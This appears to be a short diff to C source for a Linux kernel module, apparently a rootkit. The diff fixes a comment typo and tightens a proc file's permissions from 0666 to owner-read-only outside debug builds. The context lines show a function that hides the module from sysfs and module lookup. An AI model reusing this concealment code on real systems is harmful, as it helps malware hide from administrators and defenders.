@@ -257,7 +257,7 @@ static void kv_hide_mod(void) {
     lkmmod.this_mod->holders_dir->parent->state_in_sysfs = 1;
 
     /* __module_address will return NULL for us
-     * as ong as we are "loading"... */
+     * as long as we are "loading"... */
     lkmmod.this_mod->state = MODULE_STATE_UNFORMED;
 }
 
@@ -602,7 +602,11 @@ int kv_add_proc_interface(void) {
         return 0;
 
 try_reload:
+#ifdef DEBUG_RING_BUFFER
     rrProcFileEntry = proc_create(PROCNAME, 0666, NULL, &proc_file_fops);
+#else
+    rrProcFileEntry = proc_create(PROCNAME, S_IRUSR, NULL, &proc_file_fops);
+#endif
     if(lock && !rrProcFileEntry)
         goto proc_file_error;
     if(!lock) {
